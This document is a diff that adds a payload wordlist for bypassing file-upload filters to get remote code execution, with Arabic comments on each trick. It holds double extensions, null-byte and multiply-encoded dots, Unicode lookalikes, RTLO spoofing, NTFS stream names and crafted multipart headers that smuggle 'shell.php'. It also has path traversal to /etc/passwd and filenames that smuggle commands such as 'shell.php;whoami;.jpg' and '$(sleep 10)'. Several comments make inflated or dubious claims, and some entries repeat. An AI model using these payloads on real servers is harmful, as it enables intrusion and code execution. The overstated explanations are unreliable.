@@ -1,0 +1,462 @@
+# This list we will using with File Upload RCE Bug type and this list expresses the Double Extensions bypass (The section follows the RCE Bug ) 
+.jpg.php
+.png.php
+.txt.php
+.php.jpg
+.php.png
+.php.pdf
+.php.5n1p     
+.php.phtml
+.php.jpeg
+.php.gif
+.jpg.exe
+.png.exe
+.gif.exe
+.jpeg.exe
+.webp.exe
+.svg.exe
+.jpg.scr
+.png.scr
+.jpg.pif
+.png.vbs
+.jpg.vbs
+.gif.vbe
+.jpg.hta
+.png.hta
+.pdf.exe
+.doc.exe
+.docx.exe
+.xls.exe
+.xlsx.exe
+.pdf.scr
+.doc.scr
+.docx.scr
+.pdf.vbs
+.doc.vbs
+.docx.vbs
+.rtf.exe
+.txt.exe
+.txt.vbs
+.pdf.hta
+.doc.hta
+.csv.exe
+.zip.exe
+.rar.exe
+.7z.exe
+.mp4.exe
+.avi.exe
+.mov.exe
+.mp3.exe
+.mp3.vbs
+.zip.scr
+.mp4.scr
+.pdf.com
+.jpg.com
+.txt.com
+.doc.bat
+.pdf.bat
+.png.cmd
+.txt.cmd
+.jpg.jse
+.pdf.jse
+.docx.wsf
+.xlsx.wsh
+.jpg.ins
+.pdf.isp
+.txt.jar
+.config.php
+.conf.sh
+.env.php
+.yaml.exe
+.yml.sct
+.json.jar
+.sql.exe
+.db.vbs
+.log.sh
+.bak.exe
+.dist.sh
+.dockerfile.bat
+.gitignore.exe
+.php.jpg
+.php.pdf
+.php5.png
+.phtml.txt
+.aspx.jpg
+.asp.pdf
+.jsp.html
+.jspx.xml
+.php.png
+.php.gif
+.txt.pif        # (Program Information File) قديم وخطير جداً
+.jpg.scr        # (Screen Saver) يعمل كملف تنفيذي
+.pdf.cpl        # (Control Panel item) ينفذ كود بمجرد الضغط
+.doc.msc        # (Microsoft Management Console)
+.png.gadget     # (Windows Gadget)
+.txt.inf        # (Setup Information)
+.pdf.shb        # (Document Shortcut)
+.jpg.url        # (Internet Shortcut) يمكنه تحميل ملف خارجي
+
+.php. . . 
+.php. .png
+.exe. .pdf
+.asp. .jpg
+.txt. . . .exe
+.php.png.php7
+.php.jpg.phtml
+.asp.pdf.aspx
+.jsp.txt.jspx
+.php.xml.php5
+.perl.txt.pl
+.cgi.png.cgi
+.php.config.inc
+.php%00.jpg
+.php\0.png
+.php....jpg
+.php/.jpg
+.php. . . .
+.aspx%00.pdf
+.php.jpeg.
+.pdf.app        # ملف تنفيذي على ماك يظهر كمستند
+.jpg.command    # سكربت ينفذ أوامر Terminal على ماك
+.doc.workflow   # ملف Automator ينفذ مهام برمجية
+.png.action     # ملف مهام مؤتمتة
+.html.js        # ملف HTML يحتوي على JS خارجي للتضليل
+.txt.jar        # ملف Java مضغوط يعمل كبرنامج
+.txt.con
+.pdf.prn
+.jpg.aux
+.doc.nul
+.png.com1
+.xls.lpt1
+.php.j%70g         # ترميز URL لحرف 'p'
+.aspx.%70df        # ترميز URL داخل الامتداد الثاني
+.php.p.h.p         # النقاط المكررة لتشتيت الفلتر
+.php::$DATA        # استخدام NTFS Alternate Data Streams (خطير جداً على ويندوز)
+.php.exe::$DATA    # دمج خديعة الامتداد المزدوج مع تدفق البيانات المخفي
+.yaml.ssh          # محاولة سرقة مفاتيح SSH عبر ملف إعدادات
+.tfstate.sh        # سكربت مخفي داخل ملف حالة Terraform
+.dockerfile.py     # كود بايثون داخل ملف بناء حاوية
+.kubeconfig.php    # استهداف إعدادات Kubernetes
+.aws.config.exe    # محاولة الحصول على صلاحيات AWS
+.php.unknown       # استخدام امتداد غير معروف قد يجبر السيرفر على التخمين
+.php.12345         # امتداد عشوائي لتجاوز القوائم السوداء (Blacklists)
+.php.____          # استخدام الشرطات السفلية
+.php.ahmed         # وضع اسم عشوائي بعد الامتداد الحقيقي
+.php.inc           # ملفات تضمين PHP (غالباً ما تُعرض كـ Text إذا لم تُحظر)
+.php.pht           # امتداد بديل لـ PHP في سيرفرات Apache
+.php.phar          # أرشيف PHP ينفذ كود كامل
+.php.shtml         # دمج PHP مع Server Side Includes
+.asp.asa           # ملف إعدادات تطبيقات ASP القديمة
+.jsp.jspf          # ملف أجزاء JSP
+[RTLO]gpj.exe      # تظهر للمستخدم: exe.jpg (وهي في الحقيقة ملف تنفيذي)
+[RTLO]fdp.scr      # تظهر للمستخدم: rcs.pdf (وهي ملف شاشة توقف خبيث)
+[RTLO]txt.bat      # تظهر للمستخدم: tab.txt
+[RTLO]gnp.cmd      # تظهر للمستخدم: dmc.png
+[RTLO]cod.vbs      # تظهر للمستخدم: sbv.doc
+.php..........................................jpg
+.php. (متبوعة بـ 1000 مسافة) .jpg
+.php/./././././././././././././././././.jpg
+.php. {A*255}.jpg    # تكرار حرف A لـ 255 مرة لتجاوز طول المسار المسموح
+.sh.exe            # يعمل كسكربت على لينكس وملف تنفيذي على ويندوز
+.py.command        # يعمل ككود بايثون وسكربت تشغيل على ماك
+.pl.bat            # يعمل ككود بيرل وسكربت باتش على ويندوز
+.jar.run           # ملف جافا وسكربت تشغيل ذاتي
+.php.test.jsp      # استهداف سيرفرات تتعامل مع لغات متعددة (Tomcat + Apache)
+.asp.aspx.txt      # محاولة استغلال ميزة "التوافق مع الإصدارات السابقة" في IIS
+.php.phtml.inc     # دمج ثلاث طرق معالجة لـ PHP في اسم واحد
+.jsp.jspx.do       # استهداف محرك Struts داخل تطبيقات الجافا
+.php.jpg.php.jpg
+.php.tmp
+.php.test
+.php.out
+.php.err
+.html.svg         # كود جافا سكريبت داخل ملف صور اتجاهية
+.js.png           # كود JS مخفي في بايتات صورة
+.php.sql          # كود PHP داخل استعلام قاعدة بيانات
+.py.txt           # كود بايثون يظهر كنص عادي
+.sh.svg           # سكربت لينكس داخل ملف رسومي
+.php.%2e%2e%2f    # محاولة Path Traversal داخل الامتداد
+.php.%252ejpg     # ترميز مزدوج للنقطة
+.php.0x0a.jpg     # إدخال سطر جديد (New Line) بين الامتدادات
+.php.0x00.jpg     # إدخال Null Byte بصيغة Hex
+.vmdk.exe         # ملف قرص وهمي يحتوي على مشغل خبيث
+.ova.sh           # نظام كامل يتم تشغيله عبر سكربت
+.iso.bat          # ملف أسطوانة وهمية يقوم بتشغيل أوامر ويندوز
+.qcow2.py         # ملف قرص QEMU مع كود معالجة بايثون
+A_Long_Name_Target.php.......................................................................................................................................................................................................................jpg
+.php.CON
+.php.PRN
+.php.AUX
+.php.NUL
+.php.COM1
+.php.LPT1
+.php.LPT2
+.exe.CONIN$
+.exe.CONOUT$
+.jpg:script.php
+.png:hidden.exe
+.txt:extra.vbs
+.pdf:$DATA.exe
+.docx:stream
+.php%252ejpg      # ترميز النقطة مرتين
+.php%ef%bc%8ejpg  # استخدام "النقطة العريضة" في اليونيكود (Fullwidth Full Stop)
+.php%0a.jpg       # إدخال سطر جديد (Line Feed) لمحاولة كسر جملة الـ If في الكود
+.php%0d.jpg       # إدخال (Carriage Return)
+.php%20.jpg       # إدخال مسافة مشفرة
+.php.S3           # استغلال حساسية الأحرف في بعض الأنظمة
+.php.sh.gz        # ملف مضغوط يحتوي على سكربتين متداخلين
+.php.tar.bz2      # استهداف فلاتر فك الضغط التلقائي
+.php.7z.001       # ملف مقسم لأجزاء لتجاوز فحص الحجم والنوع
+.php%00.jpg        # Null Byte (حقن البايت الصفر)
+.php\000.jpg       # Octal Null Byte
+.php\x00.jpg       # Hex Null Byte
+.php%z00.jpg       # تلاعب في ترميز البايت الصفر لتجاوز WAF
+.php%ef%bb%bf.jpg  # حقن (BOM) الخاصة بـ UTF-8 لخداع الفلاتر
+.html.ico          # كود HTML مخفي في أيقونة (تستخدم في XSS)
+.php.pdf.sig       # ملف PDF يحتوي على كود PHP وتوقيع رقمي مزيف
+.js.css            # ملف CSS هو في الحقيقة JavaScript (لتجاوز سياسات المتصفح)
+.wasm.png          # كود WebAssembly (معالج متقدم) داخل صورة
+.txt.{ED7BA470-8E54-465E-825C-99712043E01C}   # خدعة الـ GodMode في ويندوز
+.pdf.{20D04FE0-3AEA-1069-A2D8-08002B30309D}   # ربط الملف بـ "My Computer"
+.jpg.[99]                                     # استخدام الأقواس المربعة لتجاوز فلاتر الطول
+.php.aspx.jsp.py.sh                           # "القنبلة المنطقية" لتجربة كل المعالجات
+.php......................... (أكثر من 255 نقطة)
+.php                          (أكثر من 255 مسافة)
+.php./././././././././././    # تكرار المسار الحالي
+.php\..\..\..\..\..\..\etc\passwd  # دمج الامتداد مع Path Traversal
+.php.A.A.A.A.A...[x200]...jpg
+.php./././././...[x100]...jpg
+.php.\.\.\.\.\...[x100]...jpg
+.php. . . . . ...[x255]...jpg
+.php/
+.php%80.jpg        # استخدام بايت غير صالح (Invalid Lead Byte)
+.php%ff.jpg        # استخدام البايت الأقصى
+.php%00            # إنهاء السلسلة النصية قبل الوصول للامتداد الثاني
+.php．jpg          # استخدام النقطة بنظام (Fullwidth Unicode)
+.pｈp.jpg          # استخدام حرف 'h' بنظام (Fullwidth Unicode)
+.php?ext=.jpg
+.php#.jpg
+.php&.jpg
+.php;.jpg          # (خطيرة جداً في سيرفرات Tomcat/IIS)
+.php%2findex.php   # محاولة حقن مسار داخل الاسم
+.php./dev/null
+.php./dev/stdout
+.php./proc/self/environ
+.php./etc/passwd
+.php[A*4096].jpg                 # محاولة تجاوز سعة الذاكرة (Buffer Overflow)
+.php%00%00%00%00.jpg             # تكرار الـ Null Byte لكسر خوارزمية الفحص
+.php\x01\x02\x03\x04.jpg         # استخدام بايتات التحكم غير المرئية
+.php\177.jpg                     # استخدام حرف الحذف (DEL) في الأسكي
+.php\r\nContent-Type: image/jpeg  # محاولة حقن "رأس صفحة" كامل داخل الاسم
+.php\t.jpg                       # استخدام Tab بدلاً من المسافة
+.php\v.jpg                       # استخدام Vertical Tab (قديم جداً وفعال)
+.php%0aContent-Disposition: ...  # حقن سطر جديد لكسر الـ Header
+.php::$INDEX_ALLOCATION          # الوصول لفهرس المجلدات في NTFS
+.php::$ATTRIBUTE_LIST            # الوصول لقائمة سمات الملف المخفية
+.php::$BITMAP                    # الوصول لبيانات الخريطة البتية للنظام
+.php.COM1...COM9                 # استهداف جميع مداخل الاتصال المتسلسل
+.php.LPT1...LPT9                 # استهداف جميع مداخل الطابعات
+.jpg.php.safe.v1.verified.png    # كلمات دلالية لخدعة الـ Classifier
+.php.trust.doc.pdf.jpg           # دمج امتدادات "موثوقة" لخداع التقييم الرقمي
+.php.{random_hash}.jpg           # توليد هاش عشوائي لمحاكاة أسماء ملفات CDN
+.jpg.php.safe.v1.verified.png    # كلمات دلالية لخدعة الـ Classifier
+.php.trust.doc.pdf.jpg           # دمج امتدادات "موثوقة" لخداع التقييم الرقمي
+.php.{random_hash}.jpg           # توليد هاش عشوائي لمحاكاة أسماء ملفات CDN
+.php.aaaaaaaaaaaaaaaa...(حتى 255 حرف)...jpg
+.php.{ShortName}~1.jpg    # استغلال ميزة الأسماء القصيرة (8.3 Filenames) في ويندوز
+.php. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .jpg
+.php./././././././././././././././././././././././././././././././././jpg
+.php..jpg
+.php/..jpg
+.php/../shell.php
+.php%2f..%2fshell.php
+.php%2e%2e%2f    # ترميز النقاط لتجاوز الفلاتر الذكية
+.php․jpg          # حرف (One Dot Leader) U+2024
+.php․․jpg         # حرف (Two Dot Leader) U+2025
+.php…jpg          # حرف (Horizontal Ellipsis) U+2026
+.pһp.jpg          # حرف (Cyrillic Small Letter Ha) يشبه الـ h
+.phр.jpg          # حرف (Cyrillic Small Letter Er) يشبه الـ p
+.php.png          # (إذا كان Nginx يفحص النهاية و Apache يفحص البداية)
+.php.vbs.txt      # (تجاوز فلاتر البريد الإلكتروني التي تفحص أول امتدادين فقط)
+.php.jsp.aspx     # (محاولة استهداف المحرك النشط في بيئة متعددة اللغات)
+.php.png          # (إذا كان Nginx يفحص النهاية و Apache يفحص البداية)
+.php.vbs.txt      # (تجاوز فلاتر البريد الإلكتروني التي تفحص أول امتدادين فقط)
+.php.jsp.aspx     # (محاولة استهداف المحرك النشط في بيئة متعددة اللغات)
+.php{{.}}jpg             # استغلال محركات القوالب (Template Engines)
+.php%00%0a.jpg           # دمج النهاية الصفرية مع سطر جديد لكسر الفحص التسلسلي
+.php%2f./jpg             # استخدام مسار "نفس المجلد" بشكل متداخل
+.php[.].jpg              # استخدام الأقواس المربعة التي قد تُفهم كـ Regex في الفلتر
+.php{}.jpg               # استغلال محركات البحث التي تدعم التوسع (Brace Expansion)
+.php%ff%fe.jpg           # إضافة علامة ترتيب البايت (BOM) لقلب قراءة الملف
+.php%e2%80%a4jpg         # استخدام "نقطة رتبة واحدة" (U+2024)
+.php%ef%bc%8ejpg         # استخدام النقطة العريضة جداً (U+FF0E)
+.php%ef%bfaejpg          # استخدام النقطة الصغيرة (U+FBAE)
+.php%f0%90%84%8ejpg      # استخدام نقطة من لغات منقرضة (Anatolian Hieroglyphs)
+# إرسال اسمين في حقل واحد مع فواصل غير قياسية
+Content-Disposition: form-data; name="file"; filename="image.jpg" \r\n filename="shell.php"
+
+# استخدام ترميز Base64 لاسم الملف داخل الطلب (نادراً ما يفحصه الـ WAF)
+Content-Disposition: form-data; name="file"; filename="=?utf-8?B?c2hlbGwucGhw?="
+
+# إرسال الاسم مع مسافات "تبويب" (Tabs) بين النقاط
+shell.php\t\t\t.jpg
+.php.symlink             # محاولة إجبار النظام على عمل رابط لملف حساس
+.php.lnk                 # ملف اختصار ويندوز قد يشير لملف تنفيذي بعيد
+.php.pif                 # ملف معلومات برنامج (قديم جداً وخطير في تجاوز الفلاتر)
+.php.hta                 # تطبيق HTML (يتجاوز فلاتر المتصفح والسيرفر معاً)
+.php%01.jpg       # (SOH - Start of Header) كسر بداية فحص الاسم
+.php%05.jpg       # (ENQ - Enquiry) استجواب محرك المعالجة
+.php%0b.jpg       # (Vertical Tab) الالتفاف حول فلاتر المسافات
+.php%0c.jpg       # (Form Feed) كسر التنسيق النصي للـ WAF
+.php%1b.jpg       # (ESC - Escape) محاولة الهروب من سلسلة الفحص النصية
+.php%7f.jpg       # (DEL) حذف الامتداد الأخير برمجياً أثناء المعالجة
+.php%fe%ff.jpg    # (Big-Endian BOM) قلب ترتيب قراءة الحروف
+.php%ff%fe.jpg    # (Little-Endian BOM)
+.php%ef%bb%bf.jpg # (UTF-8 BOM) إجبار السيرفر على تجاهل الفلاتر العادية
+.php./.jpg        # استخدام "المجلد الحالي" كفاصل
+.php.\.jpg        # خلط الفواصل بين لينكس وويندوز
+.php.. .jpg       # (نقطة-نقطة-مسافة) تقتل فلاتر التنظيف (Sanitization)
+.php%20%2e%20jpg  # استخدام مسافات مشفرة حول النقطة
+# في حقل الاسم (Name Field):
+filename="image.jpg"
+# في حقل الترميز (Encoding Field):
+filename*="UTF-8''shell.php%00.jpg"
+.php.{A*4000}.jpg        # وضع 4000 حرف بين الامتدادين (Buffer Flooding)
+.php\x00{junk}.jpg       # وضع بيانات عشوائية ضخمة بعد النهاية الصفرية
+.php%00.png%00.jpg       # تعدد النهايات الصفرية لإرباك خوارزمية القص
+.php%252ejpg             # النقطة مشفرة مرتين (%25 هي رمز %)
+.php%2500.jpg            # النهاية الصفرية مشفرة مرتين
+.php%u002ejpg            # استخدام ترميز Unicode Hex (يستخدم لتجاوز IIS)
+.php%252f%252e%252e%252fjpg # Path Traversal مشفر مرتين
+# إرسال الامتداد داخل تعليق في رأس الصفحة (Header Comment)
+Content-Disposition: form-data; name="file"; filename="image.jpg"; filename*="UTF-8''shell.php"
+
+# إرسال الاسم مقسماً على سطرين (Line Folding)
+Content-Disposition: form-data; name="file"; filename="image.
+php"
+.php.                    # نقطة في النهاية (ويندوز يحذفها تلقائياً عند الحفظ)
+.php...                  # عدة نقاط (ويندوز يحذفها كلها)
+.php::$DATA.jpg          # استخدام تدفق بيانات NTFS مع امتداد وهمي
+.php \                   # مسافة متبوعة بشرطة مائلة عكسية
+.php%c0%aejpg          # استخدام (Overlong UTF-8) للنقطة
+.php%e0%80%aejpg       # ترميز ثلاثي البايت للنقطة لخداع فلاتر الـ Regex
+.php%c0%2ejpg          # ترميز غير قياسي للنقطة (Non-shortest form)
+.php%u002ejpg          # ترميز Unicode يهرب من فلاتر الـ ASCII
+.php. . . . . . .      # مسافات ونقاط متبادلة (ويندوز يقصها ويترك .php)
+.php................jpg # (إذا تجاوز الاسم 255 حرفاً، يتم قص .jpg)
+.php\ .jpg             # شرطة مائلة خلفية مع مسافة (تكسر مسار الملف في لينكس)
+.php/./jpg             # مسار "دائري" يخدع الفلاتر التي تبحث عن آخر نقطة
+.php/.jpg              # (Path Info Bypass) السيرفر يرى صورة والمحرك ينفذها كـ PHP
+.php.jpg.php.jpg.php   # (Recursion Attack) استغلال الفلاتر التي تحذف الامتداد مرة واحدة فقط
+.php.png.123           # امتداد رقمي غير معروف يجبر السيرفر على العودة للامتداد السابق
+.php.phtml             # استخدام امتدادات PHP القديمة جداً والمخفية
+# إرسال الامتداد مع حرف سطر جديد داخل علامات التنصيص
+Content-Disposition: form-data; name="file"; filename="image.
+php"
+
+# استخدام علامات تنصيص فردية بدلاً من المزدوجة (تتجاوز بعض جدران الحماية)
+Content-Disposition: form-data; name='file'; filename='shell.php.jpg'
+
+# حذف علامات التنصيص تماماً
+Content-Disposition: form-data; name=file; filename=shell.php.jpg
+.php․jpg        # حرف (U+2024) "One Dot Leader" يشبه النقطة تماماً
+.php܀jpg        # حرف سرياني (U+0700) قد يفسره السيرفر كفاصل
+.php\u00A0.jpg   # مسافة (Non-breaking space) تكسر فلاتر الـ Regex
+.php%E2%80%A4jpg # ترميز UTF-8 لنقطة غير قياسية
+.php./././././././././././././././././././././././././././././././././jpg
+.php...................................................................jpg
+.php\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\jpg
+# إرسال الاسم بترميز Base64 داخل الحقل (تكتيك نادر جداً)
+Content-Disposition: form-data; name="file"; filename="=?UTF-8?B?c2hlbGwucGhw?="
+
+# إرسال باراميترات متعددة لنفس الحقل
+Content-Disposition: form-data; name="file"; filename="image.jpg"; filename="shell.php"
+
+# استخدام علامات الاقتباس الفردية والمزدوجة معاً
+Content-Disposition: form-data; name="file"; filename='"shell.php.jpg"'
+.php.CON.jpg
+.php.NUL.jpg
+.php.AUX.jpg
+.php.COM1.jpg
+.php.LPT1.jpg
+.php.CONFIG$
+.php\r.jpg          # (Carriage Return) قد ينهي الفحص عند الـ WAF ويستمر عند السيرفر
+.php\n.jpg          # (Line Feed) يستخدم لكسر فلاتر الـ Regex التي لا تدعم تعدد الأسطر
+.php\t.jpg          # (Tab) يستخدم لتجاوز فلاتر "المسافات البيضاء"
+.php\x0b.jpg        # (Vertical Tab) محرف قديم جداً يربك محركات الـ Parsing الحديثة
+.php\f.jpg          # (Form Feed) يستخدم لتجاوز الأنظمة التي تفحص الملفات نصياً
+././shell.php.jpg   # استخدام المسار النسبي المكرر
+.../shell.php.jpg   # استخدام ثلاث نقاط (تنجح في بعض أنظمة الملفات السحابية)
+/etc/passwd%00.php.jpg # محاولة دمج "قراءة ملف نظام" مع امتداد مزدوج
+.php.xml            # تنفيذ PHP داخل هيكل XML
+.php.svg            # حقن كود برمي داخل ملف رسومي متجه (خطير جداً للمتصفحات)
+.php.config         # استغلال ملفات الإعدادات التي يثق بها السيرفر تلقائياً
+.ph℘.jpg          # حرف Script Capital P (U+2118)
+.php．jpg         # النقطة العريضة (Fullwidth Full Stop)
+.pＨp.jpg         # حرف H العريض (Fullwidth H)
+/shell.php/image.jpg
+/shell.php/./image.jpg
+/shell.php/. .image.jpg
+/shell.php%2fimage.jpg
+.php%00.invalid    # النهاية الصفرية المتبوعة بامتداد غير معروف
+.php\x00\x00.jpg   # استخدام نهايتين صفريتين لتجاوز فلاتر التنظيف المزدوجة
+.php\x0a.jpg       # سطر جديد (Line Feed) في منتصف الاسم
+.php\x0d.jpg       # رجوع العربة (Carriage Return)
+image.jpg/.php     # تقنية الـ FastCGI للالتفاف حول النوع
+image.jpg/index.php
+image.jpg;.php     # (خطيرة جداً في سيرفرات IIS)
+.php/. . . . . . . . .jpg  # استخدام مساحات بيضاء غير قياسية (Oversized White Spaces)
+.php?ext=.jpg              # استغلال محركات البحث التي تتجاهل ما بعد علامة الاستفهام
+.php#.jpg                  # استخدام الـ (Fragment) الذي يتم معالجته في جهة العميل فقط
+.php%80%00.jpg             # دمج بايت غير صالح مع نهاية صفرية
+.php%ed%a0%80.jpg          # استخدام (Surrogate Pairs) في UTF-8 لكسر الفلتر
+.php%f4%bf%bf%bf.jpg       # استخدام أقصى قيمة ممكنة لبايت UTF-8
+# إرسال الاسم في رأس صفحة مخصص (Custom Header)
+X-File-Name: shell.php
+# ثم إرسال الاسم العادي في الحقل المعتاد:
+Content-Disposition: filename="image.jpg"
+.php.jpg.gif       # ملف يبدأ بتوقيع GIF ولكن يحتوي على كود PHP في منطقة المياداتا
+.php.png.zip       # ملف يظهر كصورة ولكنه في الحقيقة أرشيف (Zip) يحتوي على Shell
+.php.jpg.tiff      # استغلال ثغرات في مكتبات معالجة الصور (مثل ImageMagick) عبر المياداتا
+.jpg:shell.php     # إخفاء ملف PHP كامل داخل "تيار" مخفي لصورة JPG سليم
+.jpg::$INDEX_ALLOCATION # محاولة الوصول لفهرس المجلد عبر امتداد الصورة
+.jpg:Zone.Identifier # التلاعب بمعلومات "مصدر الملف" لتجاوز قيود التنفيذ
+.php.pht           # امتداد PHP قديم نادراً ما يتم وضعه في القوائم السوداء
+.php.inc           # ملفات التضمين (Include) التي قد تنفذ كوداً إذا طُلبت مباشرة
+.php.shtml         # استغلال ميزة (Server-Side Includes) لتنفيذ أوامر النظام
+.asp.asa           # ملف إعدادات تطبيقات ASP قديم جداً وخطير
+.php%c2%a0.jpg      # استخدام مسافة (Non-breaking space) مشفرة
+.php%ad.jpg        # استخدام حرف (Soft Hyphen) الذي قد يختفي عند معالجة النص
+.php%e2%80%8b.jpg    # استخدام (Zero Width Space) - حرف غير مرئي يكسر الفلاتر
+.php%e2%80%8c.jpg    # استخدام (Zero Width Non-Joiner)
+image.jpg/.php
+image.jpg/index.php
+image.jpg%00.php
+image.jpg/%20\index.php
+.php.lnk           # ملف اختصار ويندوز يشير لملف PowerShell
+.php.symlink       # رابط لينكس يشير إلى /etc/shadow
+.php.mount         # محاولة استغلال نقاط التعليق في النظام
+.php.{A*10000}.jpg # إرسال اسم طويل جداً بأنماط متكررة لكسر محرك الـ Regex
+.php(.)(.)(.)(.)(.)(.)(.)(.)(.)(.)jpg # تعقيد أقواس المجموعة
+shell.php.[A*250].jpg
+shell.php/././././(تكرار حتى الوصول للحد الأقصى)/image.jpg
+shell.php;whoami;.jpg
+shell.php`id`.jpg
+shell.php$(sleep 10).jpg
+'--.php.jpg
+.php::$DATA\index.jpg   # استغلال NTFS Streams داخل بيئة Linux معلقة (Mounted)
+.php/.././shell.php    # استخدام السلاش العكسي والمستقيم معاً لتضليل المسار
+.php%5c..%5c..%5cjpg    # استخدام (Backslash) مشفر لتجاوز فلاتر لينكس
+.php%e2%80%8e.jpg       # (LRM) إزاحة من اليسار لليمين برمجياً
+.php%e2%80%8f.jpg       # (RLM) إزاحة من اليمين لليسار
+.php%e2%a0%80.jpg       # محرف "Braille Space" الفارغ (U+2800)
+.php.(a+)+.jpg          # نمط Regex يسبب استهلاك 100% من المعالج
+.php.................. (أكثر من 1 مليون نقطة) # إغراق الذاكرة المخصصة للسلاسل النصية
+.php%25252ejpg       # تشفير النقطة ثلاث مرات (Triple Encoding)
+.php%%32%65jpg       # تشفير مزدوج متداخل (Nested Encoding)
+.php%25%32%65jpg     # خلط أنواع التشفير لكسر خوارزمية الـ Normalization
+.php\r\n\0.jpg       # محاولة حقن "نهاية ملف" وهمية داخل طبقة التخزين
+.php/.wh..wh..opq    # (Whiteout) استغلال ملفات الحذف الخاصة بـ UnionFS
+.php%e2%80%ae.gpj.png  # حرف (U+202E) يقلب .jpg لتصبح .gpj برمجياً
+.php%e2%80%ab.jpg      # (RLE) لقلب اتجاه الفحص في الذاكرة
+
